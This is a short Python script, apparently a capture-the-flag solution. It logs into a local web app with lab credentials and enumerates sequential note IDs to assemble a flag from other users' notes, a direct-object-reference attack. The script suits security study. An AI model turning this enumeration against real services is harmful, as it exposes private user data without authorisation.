import requests
from bs4 import BeautifulSoup

BASE_URL = "http://localhost:5012/"
flag=" "
i=1
session = requests.Session()
session.post(BASE_URL + "login", data={"username": "user", "password": "userpass"})
while flag[-1]!="}":
    response = session.get(BASE_URL + 'notes/' + str(i))
    if response.status_code == 200:
        res = response.text
        soup = BeautifulSoup(res, 'html.parser')
        content = soup.select_one('p.note-content')
        note=content.get_text(strip=True) if content else ''
        if note:
            print(f"Note {i}: {note}")
        if  str(note) != 'not here':
            flag += str(note)
            print("Flag so far:", flag)
    i += 1

if flag:
    print("Flag:", flag)
else:
    print("No flag found.")